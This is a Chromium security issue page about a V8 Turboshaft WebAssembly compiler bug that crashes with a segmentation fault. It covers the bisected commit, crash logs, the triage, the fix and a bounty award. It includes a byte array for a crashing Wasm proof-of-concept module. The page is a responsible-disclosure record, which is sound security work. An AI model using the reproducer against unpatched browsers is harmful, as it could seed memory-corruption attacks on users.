# Security: Title : Debug check failed: Asm().current_block()->IsMerge() && inputs.size() == Asm().current_block()->Predecessors().size(). in v8, leading to SEGV

| Field | Value |
|-------|-------|
| **Issue ID** | [41483711](https://issues.chromium.org/issues/41483711) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Compiler>Turbofan |
| **Platforms** | Linux, Mac |
| **Reporter** | je...@gmail.com |
| **Assignee** | dm...@chromium.org |
| **Created** | 2023-12-13 |
| **Bounty** | $8,000.00 |

## Description

VULNERABILITY DETAILS
## INTRODUCE
After bisect, it was determined that following commit caused this problem.

- Commit Info
    - Version: 91383
    - link: https://crrev.com/196726259ed8f3898b4c51c7dc79d1b6b32ff7e3
- Commit Message

```
commit 196726259ed8f3898b4c51c7dc79d1b6b32ff7e3
Author: Jakob Kummerow <jkummerow@chromium.org>
Date:   Wed Dec 6 17:50:03 2023 +0100

    [turboshaft][wasm] Fix InstanceCache handling for catch and call_ref

    This patch addresses two distinct but related issues:
    (1) For the custom control flow we set up for inlining call_ref calls,
        the InstanceCache system must properly track this control flow
        (simulating what a SnapshotTable would do).
    (2) When catching exceptions, we must reload the memory size at the
        beginning of the catch block. And similar to (1), the InstanceCache
        must properly track the control flow between regular return block,
        catch block, and their merge.

    Fixed: chromium:1507751
    Bug: v8:14108
    Change-Id: I707f007ae1d49ee0b6db0acad62bcdeb7cd12a46
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5095095
    Reviewed-by: Matthias Liedtke <mliedtke@chromium.org>
    Auto-Submit: Jakob Kummerow <jkummerow@chromium.org>
    Commit-Queue: Jakob Kummerow <jkummerow@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#91383}

```

## CRASH LOG
- Debug output

```bash
# CMD: /tmp/d8-linux-debug-v8-component-91425/d8 --turboshaft-wasm --allow-natives-syntax --wasm-tiering-budget=1000 poc.js
# OUTPUT ==============================================================


#
# Fatal error in ../../src/compiler/turboshaft/assembler.h, line 823
# Debug check failed: Asm().current_block()->IsMerge() && inputs.size() == Asm().current_block()->Predecessors().size().
#
#
#
#FailureMessage Object: 0x7fef6adb29f0
==== C stack trace ===============================

    /tmp/d8-linux-debug-v8-component-91425/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x13) [0x7fef79b47dd3]
    /tmp/d8-linux-debug-v8-component-91425/libv8_libplatform.so(+0x19add) [0x7fef79aeeadd]
    /tmp/d8-linux-debug-v8-component-91425/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x154) [0x7fef79b27e74]
    /tmp/d8-linux-debug-v8-component-91425/libv8_libbase.so(+0x2b935) [0x7fef79b27935]
    /tmp/d8-linux-debug-v8-component-91425/libv8.so(v8::internal::compiler::turboshaft::GenericReducerBase<v8::internal::compiler::turboshaft::TSReducerBase<v8::internal::compiler::turboshaft::ReducerStack<v8::internal::compiler::turboshaft::Assembler<v8::internal::compiler::turboshaft::reducer_list<v8::internal::compiler::turboshaft::TurboshaftAssemblerOpInterface, v8::internal::compiler::turboshaft::SelectLoweringReducer, v8::internal::compiler::turboshaft::DataViewReducer, v8::internal::compiler::turboshaft::VariableReducer, v8::internal::compiler::turboshaft::RequiredOptimizationReducer, v8::internal::compiler::turboshaft::TSReducerBase>>, false>>>::ReducePhi(v8::base::Vector<v8::internal::compiler::turboshaft::OpIndex const>, v8::internal::compiler::turboshaft::RegisterRepresentation)+0x16d) [0x7fef7892db0d]
    /tmp/d8-linux-debug-v8-component-91425/libv8.so(v8::internal::compiler::turboshaft::RequiredOptimizationReducer<v8::internal::compiler::turboshaft::ReducerStack<v8::internal::compiler::turboshaft::Assembler<v8::internal::compiler::turboshaft::reducer_list<v8::internal::compiler::turboshaft::TurboshaftAssemblerOpInterface, v8::internal::compiler::turboshaft::SelectLoweringReducer, v8::internal::compiler::turboshaft::DataViewReducer, v8::internal::compiler::turboshaft::VariableReducer, v8::internal::compiler::turboshaft::RequiredOptimizationReducer, v8::internal::compiler::turboshaft::TSReducerBase>>, false, v8::internal::compiler::turboshaft::TSReducerBase>>::ReducePhi(v8::base::Vector<v8::internal::compiler::turboshaft::OpIndex const>, v8::internal::compiler::turboshaft::RegisterRepresentation)+0x20c) [0x7fef7892d89c]
    /tmp/d8-linux-debug-v8-component-91425/libv8.so(v8::internal::wasm::TurboshaftGraphBuildingInterface::MaybePhi(v8::base::Vector<v8::internal::compiler::turboshaft::OpIndex const>, v8::internal::wasm::ValueType)+0x7a) [0x7fef7894cd2a]
    /tmp/d8-linux-debug-v8-component-91425/libv8.so(v8::internal::wasm::TurboshaftGraphBuildingInterface::CallRef(v8::internal::wasm::WasmFullDecoder<v8::internal::wasm::Decoder::FullValidationTag, v8::internal::wasm::TurboshaftGraphBuildingInterface, (v8::internal::wasm::DecodingMode)0>*, v8::internal::wasm::TurboshaftGraphBuildingInterface::Value const&, v8::internal::Signature<v8::internal::wasm::ValueType> const*, unsigned int, v8::internal::wasm::TurboshaftGraphBuildingInterface::Value const*, v8::internal::wasm::TurboshaftGraphBuildingInterface::Value*)+0x10b2) [0x7fef78984832]
    /tmp/d8-linux-debug-v8-component-91425/libv8.so(v8::internal::wasm::WasmFullDecoder<v8::internal::wasm::Decoder::FullValidationTag, v8::internal::wasm::TurboshaftGraphBuildingInterface, (v8::internal::wasm::DecodingMode)0>::DecodeCallRefImpl(v8::internal::wasm::WasmFullDecoder<v8::internal::wasm::Decoder::FullValidationTag, v8::internal::wasm::TurboshaftGraphBuildingInterface, (v8::internal::wasm::DecodingMode)0>::TraceLine*, v8::internal::wasm::WasmOpcode)+0x203) [0x7fef78983483]
    /tmp/d8-linux-debug-v8-component-91425/libv8.so(v8::internal::wasm::WasmFullDecoder<v8::internal::wasm::Decoder::FullValidationTag, v8::internal::wasm::TurboshaftGraphBuildingInterface, (v8::internal::wasm::DecodingMode)0>::DecodeCallRef(v8::internal::wasm::WasmFullDecoder<v8::internal::wasm::Decoder::FullValidationTag, v8::internal::wasm::TurboshaftGraphBuildingInterface, (v8::internal::wasm::DecodingMode)0>*, v8::internal::wasm::WasmOpcode)+0x8b) [0x7fef7893be8b]
    /tmp/d8-linux-debug-v8-component-91425/libv8.so(v8::internal::wasm::WasmFullDecoder<v8::internal::wasm::Decoder::FullValidationTag, v8::internal::wasm::TurboshaftGraphBuildingInterface, (v8::internal::wasm::DecodingMode)0>::DecodeFunctionBody()+0x203) [0x7fef78922723]
    /tmp/d8-linux-debug-v8-component-91425/libv8.so(v8::internal::wasm::WasmFullDecoder<v8::internal::wasm::Decoder::FullValidationTag, v8::internal::wasm::TurboshaftGraphBuildingInterface, (v8::internal::wasm::DecodingMode)0>::Decode()+0x22f) [0x7fef7891d49f]
    /tmp/d8-linux-debug-v8-component-91425/libv8.so(v8::internal::wasm::BuildTSGraph(v8::internal::AccountingAllocator*, v8::internal::wasm::WasmFeatures, v8::internal::wasm::WasmModule const*, v8::internal::wasm::WasmFeatures*, v8::internal::compiler::turboshaft::Graph&, v8::internal::wasm::FunctionBody const&, v8::internal::wasm::WireBytesStorage const*, v8::internal::wasm::AssumptionsJournal*, v8::internal::ZoneVector<v8::internal::WasmInliningPosition>*, int)+0x259) [0x7fef7891cd99]
    /tmp/d8-linux-debug-v8-component-91425/libv8.so(v8::internal::compiler::Pipeline::GenerateWasmCodeFromTurboshaftGraph(v8::internal::OptimizedCompilationInfo*, v8::internal::wasm::CompilationEnv*, v8::internal::compiler::WasmCompilationData&, v8::internal::compiler::MachineGraph*, v8::internal::wasm::WasmFeatures*, v8::internal::compiler::CallDescriptor*)+0x786) [0x7fef79074716]
    /tmp/d8-linux-debug-v8-component-91425/libv8.so(v8::internal::compiler::turboshaft::ExecuteTurboshaftWasmCompilation(v8::internal::wasm::CompilationEnv*, v8::internal::compiler::WasmCompilationData&, v8::internal::wasm::WasmFeatures*)+0x2b1) [0x7fef792c8f31]
    /tmp/d8-linux-debug-v8-component-91425/libv8.so(v8::internal::wasm::WasmCompilationUnit::ExecuteFunctionCompilation(v8::internal::wasm::CompilationEnv*, v8::internal::wasm::WireBytesStorage const*, v8::internal::Counters*, v8::internal::wasm::WasmFeatures*)+0x72b) [0x7fef78872c6b]
    /tmp/d8-linux-debug-v8-component-91425/libv8.so(v8::internal::wasm::WasmCompilationUnit::ExecuteCompilation(v8::internal::wasm::CompilationEnv*, v8::internal::wasm::WireBytesStorage const*, v8::internal::Counters*, v8::internal::wasm::WasmFeatures*)+0x192) [0x7fef788720b2]
    /tmp/d8-linux-debug-v8-component-91425/libv8.so(+0x3ad18ba) [0x7fef788d18ba]
    /tmp/d8-linux-debug-v8-component-91425/libv8.so(+0x3ad10f5) [0x7fef788d10f5]
    /tmp/d8-linux-debug-v8-component-91425/libv8_libplatform.so(v8::platform::DefaultJobWorker::Run()+0xd3) [0x7fef79aed823]
    /tmp/d8-linux-debug-v8-component-91425/libv8_libplatform.so(v8::platform::DefaultWorkerThreadsTaskRunner::WorkerThread::Run()+0xc3) [0x7fef79af0213]
    /tmp/d8-linux-debug-v8-component-91425/libv8_libbase.so(+0x4a789) [0x7fef79b46789]
    /lib/x86_64-linux-gnu/libc.so.6(+0x94ac3) [0x7fef74494ac3]
    /lib/x86_64-linux-gnu/libc.so.6(+0x126a40) [0x7fef74526a40]

```

## Other
Please note to include the flags `--turboshaft-wasm --allow-natives-syntax --wasm-tiering-budget=1000` for clusterfuzz classification.

VERSION
Tested on v8 version: 12.2.0 - 12.2.0

REPRODUCTION CASE
1. Download debug v8 from: gs://v8-asan/linux-debug/d8-linux-debug-v8-component-91425.zip
2. Run: `d8 --turboshaft-wasm --allow-natives-syntax --wasm-tiering-budget=1000 poc.js`

FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION
Type of crash: tab

CREDIT INFORMATION
Reporter credit: Jerry

Sorry, my report was written a bit early. The latest version is 91475 instead of 91425, but this vulnerability can also be reproduced on the latest version of 91475 d8.

```
d8-linux-debug-cache/d8-linux-debug-v8-component-91475/d8 --allow-natives-syntax  --turboshaft-wasm  --wasm-tiering-budget=1000 poc_code.js
0,97,115,109,1,0,0,0,1,54,12,80,0,95,0,80,0,95,0,80,0,95,0,80,0,94,127,1,80,0,94,127,1,80,0,94,127,1,80,0,94,127,1,96,3,127,127,127,1,127,96,0,0,78,1,96,0,0,96,0,0,96,0,0,3,5,4,7,8,9,10,4,5,1,112,1,4,4,5,4,1,1,16,32,13,3,1,0,11,7,8,1,4,109,97,105,110,0,0,9,20,1,6,0,65,0,11,112,4,210,0,11,210,1,11,210,2,11,210,3,11,10,202,6,4,187,5,22,1,100,107,1,100,5,2,127,1,99,113,1,110,1,99,106,1,127,1,112,1,124,1,99,10,1,100,109,1,100,110,1,111,1,99,113,1,99,9,2,127,1,100,5,1,100,9,1,99,5,1,100,9,1,124,1,99,9,65,3,17,10,0,65,60,65,238,0,65,85,65,0,17,7,0,1,65,3,17,10,0,65,3,17,10,0,208,110,251,23,0,212,251,23,110,251,20,0,65,180,237,222,238,7,65,246,220,250,137,7,65,0,17,7,0,1,68,120,81,89,248,243,82,198,21,68,11,109,201,53,161,82,58,114,99,65,247,228,209,154,124,65,133,190,208,5,254,37,1,128,1,254,61,0,222,245,2,53,1,185,218,1,254,69,0,174,242,3,167,67,250,6,58,73,16,3,67,168,75,141,187,65,3,17,10,0,65,185,249,250,241,0,65,3,17,10,0,65,216,249,135,146,127,54,2,243,230,1,152,168,254,60,0,195,171,3,65,3,17,10,0,65,3,17,10,0,65,3,17,10,0,65,3,17,10,0,65,3,17,10,0,65,3,17,10,0,65,0,253,15,65,0,253,15,65,0,253,15,253,220,1,65,0,253,15,65,0,253,15,65,0,253,15,253,220,1,253,220,1,253,12,239,232,110,161,100,180,161,161,111,69,102,142,249,65,58,79,253,220,1,65,0,253,15,65,0,253,15,65,0,253,15,65,0,253,15,253,68,65,0,253,15,65,0,253,15,253,182,1,253,42,253,124,65,0,253,15,65,0,253,15,253,75,253,220,1,253,220,1,253,220,1,65,0,253,15,67,79,173,187,221,67,54,231,229,185,93,253,16,65,0,253,15,253,137,2,66,167,211,226,232,152,220,252,202,24,122,122,122,122,122,122,122,66,194,152,178,155,192,168,138,171,125,122,131,122,122,122,122,122,122,122,122,122,122,253,30,0,65,0,253,15,65,0,253,15,253,223,1,65,0,253,15,253,223,1,65,0,253,15,253,223,1,253,118,253,35,253,220,1,253,220,1,253,220,1,65,0,253,15,65,0,253,15,253,223,1,65,0,253,15,253,223,1,65,0,253,15,253,223,1,253,12,210,33,197,211,143,162,155,143,170,22,7,228,60,212,30,33,65,0,253,15,65,0,253,15,208,112,65,221,191,160,191,122,252,15,0,253,109,253,121,253,185,1,65,0,253,15,208,112,65,0,253,15,65,0,253,15,253,147,1,253,100,252,15,0,253,141,1,253,219,1,253,239,1,65,0,253,15,65,0,253,15,253,134,1,253,38,65,0,253,15,65,0,253,15,253,36,253,227,1,253,77,65,0,253,15,65,0,253,15,253,144,1,253,235,1,253,223,1,253,223,1,253,224,1,253,220,1,253,195,1,54,1,243,198,1,251,28,251,23,107,251,22,107,33,3,65,169,172,171,137,125,65,140,250,193,243,2,65,20,111,251,6,5,33,4,65,166,240,209,248,1,251,28,33,14,251,0,0,33,15,65,196,236,203,209,122,65,249,228,141,255,122,65,20,111,251,6,5,33,21,210,2,33,22,210,2,33,24,65,159,130,238,231,126,11,4,0,8,0,11,2,0,11,130,1,0,65,194,173,179,167,1,65,249,153,134,228,5,115,65,174,166,141,155,1,65,20,111,251,6,3,212,208,108,211,65,2,17,9,0,6,125,65,2,17,9,0,65,2,17,9,0,65,2,17,9,0,6,125,67,60,20,7,147,210,1,212,212,212,212,212,212,212,20,8,65,236,197,192,229,5,65,159,254,237,218,120,65,183,158,140,193,2,108,58,0,181,245,3,208,110,251,23,108,251,30,4,64,11,11,7,0,67,199,18,81,155,25,67,17,78,12,31,11,56,2,181,189,1,12,0,2,64,11,11


#
# Fatal error in ../../src/compiler/turboshaft/graph.h, line 590
# Debug check failed: i.valid().
#
#
#
#FailureMessage Object: 0x7fb1cf987a80
==== C stack trace ===============================

    d8-linux-debug-cache/d8-linux-debug-v8-component-91475/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x13) [0x7fb1df1f4dd3]
    d8-linux-debug-cache/d8-linux-debug-v8-component-91475/libv8_libplatform.so(+0x19add) [0x7fb1df19badd]
    d8-linux-debug-cache/d8-linux-debug-v8-component-91475/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x154) [0x7fb1df1d4e74]
    d8-linux-debug-cache/d8-linux-debug-v8-component-91475/libv8_libbase.so(+0x2b935) [0x7fb1df1d4935]
    d8-linux-debug-cache/d8-linux-debug-v8-component-91475/libv8.so(v8::internal::compiler::turboshaft::Graph::Get(v8::internal::compiler::turboshaft::OpIndex)+0x60) [0x7fb1e295ddf0]
    d8-linux-debug-cache/d8-linux-debug-v8-component-91475/libv8.so(v8::internal::compiler::turboshaft::RequiredOptimizationReducer<v8::internal::compiler::turboshaft::ReducerStack<v8::internal::compiler::turboshaft::Assembler<v8::internal::compiler::turboshaft::reducer_list<v8::internal::compiler::turboshaft::TurboshaftAssemblerOpInterface, v8::internal::compiler::turboshaft::SelectLoweringReducer, v8::internal::compiler::turboshaft::DataViewReducer, v8::internal::compiler::turboshaft::VariableReducer, v8::internal::compiler::turboshaft::RequiredOptimizationReducer, v8::internal::compiler::turboshaft::TSReducerBase>>, false, v8::internal::compiler::turboshaft::TSReducerBase>>::ReducePhi(v8::base::Vector<v8::internal::compiler::turboshaft::OpIndex const>, v8::internal::compiler::turboshaft::RegisterRepresentation)+0x70) [0x7fb1e2c43d90]
    d8-linux-debug-cache/d8-linux-debug-v8-component-91475/libv8.so(v8::internal::wasm::TurboshaftGraphBuildingInterface::MaybePhi(v8::base::Vector<v8::internal::compiler::turboshaft::OpIndex const>, v8::internal::wasm::ValueType)+0x7a) [0x7fb1e2c633ba]
    d8-linux-debug-cache/d8-linux-debug-v8-component-91475/libv8.so(v8::internal::wasm::TurboshaftGraphBuildingInterface::CallRef(v8::internal::wasm::WasmFullDecoder<v8::internal::wasm::Decoder::FullValidationTag, v8::internal::wasm::TurboshaftGraphBuildingInterface, (v8::internal::wasm::DecodingMode)0>*, v8::internal::wasm::TurboshaftGraphBuildingInterface::Value const&, v8::internal::Signature<v8::internal::wasm::ValueType> const*, unsigned int, v8::internal::wasm::TurboshaftGraphBuildingInterface::Value const*, v8::internal::wasm::TurboshaftGraphBuildingInterface::Value*)+0x10b2) [0x7fb1e2c9b3a2]
    d8-linux-debug-cache/d8-linux-debug-v8-component-91475/libv8.so(v8::internal::wasm::WasmFullDecoder<v8::internal::wasm::Decoder::FullValidationTag, v8::internal::wasm::TurboshaftGraphBuildingInterface, (v8::internal::wasm::DecodingMode)0>::DecodeCallRefImpl(v8::internal::wasm::WasmFullDecoder<v8::internal::wasm::Decoder::FullValidationTag, v8::internal::wasm::TurboshaftGraphBuildingInterface, (v8::internal::wasm::DecodingMode)0>::TraceLine*, v8::internal::wasm::WasmOpcode)+0x203) [0x7fb1e2c99ff3]
    d8-linux-debug-cache/d8-linux-debug-v8-component-91475/libv8.so(v8::internal::wasm::WasmFullDecoder<v8::internal::wasm::Decoder::FullValidationTag, v8::internal::wasm::TurboshaftGraphBuildingInterface, (v8::internal::wasm::DecodingMode)0>::DecodeCallRef(v8::internal::wasm::WasmFullDecoder<v8::internal::wasm::Decoder::FullValidationTag, v8::internal::wasm::TurboshaftGraphBuildingInterface, (v8::internal::wasm::DecodingMode)0>*, v8::internal::wasm::WasmOpcode)+0x8b) [0x7fb1e2c5251b]
    d8-linux-debug-cache/d8-linux-debug-v8-component-91475/libv8.so(v8::internal::wasm::WasmFullDecoder<v8::internal::wasm::Decoder::FullValidationTag, v8::internal::wasm::TurboshaftGraphBuildingInterface, (v8::internal::wasm::DecodingMode)0>::DecodeFunctionBody()+0x203) [0x7fb1e2c38d43]
    d8-linux-debug-cache/d8-linux-debug-v8-component-91475/libv8.so(v8::internal::wasm::WasmFullDecoder<v8::internal::wasm::Decoder::FullValidationTag, v8::internal::wasm::TurboshaftGraphBuildingInterface, (v8::internal::wasm::DecodingMode)0>::Decode()+0x22f) [0x7fb1e2c33aaf]
    d8-linux-debug-cache/d8-linux-debug-v8-component-91475/libv8.so(v8::internal::wasm::BuildTSGraph(v8::internal::AccountingAllocator*, v8::internal::wasm::WasmFeatures, v8::internal::wasm::WasmModule const*, v8::internal::wasm::WasmFeatures*, v8::internal::compiler::turboshaft::Graph&, v8::internal::wasm::FunctionBody const&, v8::internal::wasm::WireBytesStorage const*, v8::internal::wasm::AssumptionsJournal*, v8::internal::ZoneVector<v8::internal::WasmInliningPosition>*, int)+0x259) [0x7fb1e2c333a9]
    d8-linux-debug-cache/d8-linux-debug-v8-component-91475/libv8.so(v8::internal::compiler::Pipeline::GenerateWasmCodeFromTurboshaftGraph(v8::internal::OptimizedCompilationInfo*, v8::internal::wasm::CompilationEnv*, v8::internal::compiler::WasmCompilationData&, v8::internal::compiler::MachineGraph*, v8::internal::wasm::WasmFeatures*, v8::internal::compiler::CallDescriptor*)+0x786) [0x7fb1e337f426]
    d8-linux-debug-cache/d8-linux-debug-v8-component-91475/libv8.so(v8::internal::compiler::turboshaft::ExecuteTurboshaftWasmCompilation(v8::internal::wasm::CompilationEnv*, v8::internal::compiler::WasmCompilationData&, v8::internal::wasm::WasmFeatures*)+0x2b1) [0x7fb1e35d3dc1]
    d8-linux-debug-cache/d8-linux-debug-v8-component-91475/libv8.so(v8::internal::wasm::WasmCompilationUnit::ExecuteFunctionCompilation(v8::internal::wasm::CompilationEnv*, v8::internal::wasm::WireBytesStorage const*, v8::internal::Counters*, v8::internal::wasm::WasmFeatures*)+0x72b) [0x7fb1e2b8acfb]
    d8-linux-debug-cache/d8-linux-debug-v8-component-91475/libv8.so(v8::internal::wasm::WasmCompilationUnit::ExecuteCompilation(v8::internal::wasm::CompilationEnv*, v8::internal::wasm::WireBytesStorage const*, v8::internal::Counters*, v8::internal::wasm::WasmFeatures*)+0x192) [0x7fb1e2b8a142]
    d8-linux-debug-cache/d8-linux-debug-v8-component-91475/libv8.so(+0x39e98ea) [0x7fb1e2be98ea]
    d8-linux-debug-cache/d8-linux-debug-v8-component-91475/libv8.so(+0x39e9125) [0x7fb1e2be9125]
    d8-linux-debug-cache/d8-linux-debug-v8-component-91475/libv8_libplatform.so(v8::platform::DefaultJobWorker::Run()+0xd3) [0x7fb1df19a823]
    d8-linux-debug-cache/d8-linux-debug-v8-component-91475/libv8_libplatform.so(v8::platform::DefaultWorkerThreadsTaskRunner::WorkerThread::Run()+0xc3) [0x7fb1df19d213]
    d8-linux-debug-cache/d8-linux-debug-v8-component-91475/libv8_libbase.so(+0x4a789) [0x7fb1df1f3789]
    /lib/x86_64-linux-gnu/libc.so.6(+0x94ac3) [0x7fb1de894ac3]
    /lib/x86_64-linux-gnu/libc.so.6(+0x126a40) [0x7fb1de926a40]
[3]    150750 trace trap  d8-linux-debug-cache/d8-linux-debug-v8-component-91475/d8  --turboshaft-wasm

```

## Release output
```
d8 --allow-natives-syntax --turboshaft-wasm --wasm-tiering-budget=1000 poc.js
Received signal 11 SEGV_MAPERR 7fae64004f57

==== C stack trace ===============================

 [0x561c60d017c7]
 [0x7fae4ec42520]
 [0x561c60429872]
 [0x561c6044bea6]
 [0x561c60430bb0]
 [0x561c60426faf]
 [0x561c60425d75]
 [0x561c60425837]
 [0x561c6076f900]
 [0x561c6089c4dc]
 [0x561c603cf6ab]
 [0x561c603cedb2]
 [0x561c603fa761]
 [0x561c603fa137]
 [0x561c60d02afb]
 [0x561c60d0599e]
 [0x561c60cfec2f]
 [0x7fae4ec94ac3]
 [0x7fae4ed26a40]
[end of stack trace]
[3]    150869 segmentation fault  test111/d8 --allow-natives-syntax --turboshaft-wasm --wasm-tiering-budget=100
```

## Attachments

- poc_code.js (text/plain, 15.1 KB)
- poc.js (text/plain, 3.2 KB)

## Timeline

### [Deleted User] (2023-12-13)

[Empty comment from Monorail migration]

### je...@gmail.com (2023-12-13)

[Comment Deleted]

### je...@gmail.com (2023-12-13)

[Comment Deleted]

### je...@gmail.com (2023-12-13)

[Comment Deleted]

### cl...@chromium.org (2023-12-13)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6607918034518016.

### cl...@chromium.org (2023-12-13)

[Empty comment from Monorail migration]

### cl...@chromium.org (2023-12-13)

[Empty comment from Monorail migration]

### je...@gmail.com (2023-12-13)

Hi, please use d8 release instead of debug to run clusterfuzzer, you will see better results. There is a problem with the debug version. 

### cl...@chromium.org (2023-12-14)

Detailed Report: https://clusterfuzz.com/testcase?key=6607918034518016

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: DCHECK failure
Crash Address: 
Crash State:
  i.valid() in graph.h
  v8::internal::compiler::turboshaft::Graph::Get
  v8::internal::compiler::turboshaft::RequiredOptimizationReducer<v8::internal::co
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=91466:91467

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6607918034518016

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### th...@chromium.org (2023-12-14)

CF did not assign a severity. Setting a provisional severity of high and assigning to the current V8 sheriff (clemensb@): could you please assess the severity?

[Monorail components: Blink>JavaScript>Compiler]

### [Deleted User] (2023-12-14)

[Empty comment from Monorail migration]

### cl...@chromium.org (2023-12-15)

High severity looks about right. Darius, can you maybe take a look while Jakob and Matthias are out?

[Monorail components: -Blink>JavaScript>Compiler Blink>JavaScript>Compiler>Turbofan]

### dm...@chromium.org (2023-12-15)

Sure, I'll have a look :)

### gi...@appspot.gserviceaccount.com (2023-12-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/be410faa8b9503a59a23388d8b578766617a8bdb

commit be410faa8b9503a59a23388d8b578766617a8bdb
Author: Darius M <dmercadier@chromium.org>
Date: Fri Dec 15 10:16:27 2023

[turboshaft][wasm] Fix InstanceCache with non-returning inlinees

It's possible that an inlined function never returns to the caller,
typically because of an unconditional trap or exceptions. When this
happens, we should try to record Phi inputs for the InstanceCache from
this inlined function body.

Bug: v8:14108
Change-Id: I02434c4b58a8144bf7ead4033dcd3db7f62b01d6
Fixed: chromium:1511124
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5126073
Reviewed-by: Manos Koukoutos <manoskouk@chromium.org>
Commit-Queue: Manos Koukoutos <manoskouk@chromium.org>
Auto-Submit: Darius Mercadier <dmercadier@chromium.org>
Cr-Commit-Position: refs/heads/main@{#91550}

[modify] https://crrev.com/be410faa8b9503a59a23388d8b578766617a8bdb/src/wasm/turboshaft-graph-interface.cc


### [Deleted User] (2023-12-15)

[Empty comment from Monorail migration]

### [Deleted User] (2023-12-15)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-12-15)

[Empty comment from Monorail migration]

### cl...@chromium.org (2023-12-16)

ClusterFuzz testcase 6607918034518016 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=91549:91550

If this is incorrect, please add the ClusterFuzz-Wrong label and re-open the issue.

### am...@chromium.org (2023-12-18)

[Description Changed]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### am...@google.com (2024-01-11)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2024-01-11)

Congratulations Jerry! The Chrome VRP has decided to award you $7,000 for this report + $1,000 bisect bonus. Thank you for your efforts and reporting this issue to us -- nice work! 

### am...@google.com (2024-01-12)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-12)

This issue was migrated from crbug.com/chromium/1511124?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

### pe...@google.com (2024-02-04)

This is sufficiently serious that it should be merged to beta. But I can't  see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M122. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Merge approved: your change passed merge requirements and is auto-approved for M122. Please go ahead and merge the CL to branch 6261 (refs/branch-heads/6261) manually. Please contact milestone owner if you have questions.
Merge instructions: https://chromium.googlesource.com/chromium/src.git/+/refs/heads/main/docs/process/merge_request.md
Owners: eakpobaro (Android), eakpobaro (iOS), ceb (ChromeOS), pbommana (Desktop)
Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Sheriffbot has determined this fix is necessary on milestone(s): [122].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


### am...@chromium.org (2024-02-04)

this fix landed on 122, removing merge approval
blintz auto-approval rules are firing a little aggressively -- an internal issue has been opened to investigate and tweak the behavior of our automation to prevent this in the future b/323744575

### pe...@google.com (2024-03-23)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/41483711)*
